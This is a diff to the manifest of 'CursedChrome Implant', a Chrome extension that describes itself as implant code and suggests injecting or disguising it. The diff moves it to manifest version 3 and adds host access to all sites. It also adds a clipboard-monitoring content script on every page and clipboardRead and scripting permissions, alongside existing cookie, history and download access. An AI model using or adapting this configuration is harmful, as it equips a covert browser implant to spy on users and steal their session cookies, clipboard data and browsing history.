@@ -1,7 +1,7 @@
 {
   "name": "CursedChrome Implant",
   "version": "0.0.1",
-  "manifest_version": 2,
+  "manifest_version": 3,
   "description": "Example Chrome extension with implant code. You should probably inject/disguise the implant instead of installing this extension directly.",
   "homepage_url": "https://thehackerblog.com",
   "icons": {
@@ -11,12 +11,14 @@
   },
   "default_locale": "en",
   "background": {
-    "scripts": ["src/bg/lame.min.js", "src/bg/RecordRTC.min.js", "src/bg/background.js"],
-    "persistent": true
+    "service_worker": "src/bg/background.js",
+    "type": "module"
   },
+  "host_permissions": [
+    "<all_urls>"
+  ],
   "permissions": [
     "webRequest",
-    "webRequestBlocking",
     "cookies",
     "history",
     "tabs",
@@ -25,6 +27,21 @@
     "bookmarks",
     "downloads",
     "storage",
-    "<all_urls>"
-  ]
+    "scripting",
+    "clipboardRead"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["src/content/clipboard-monitor.js"],
+      "run_at": "document_idle"
+    }
+  ],
+  "content_security_policy": {
+    "extension_pages": "script-src 'self'; object-src 'self'"
+  },
+  "web_accessible_resources": [{
+    "resources": ["redirect-hack.html", "src/bg/window-polyfill.js"],
+    "matches": ["<all_urls>"]
+  }]
 }
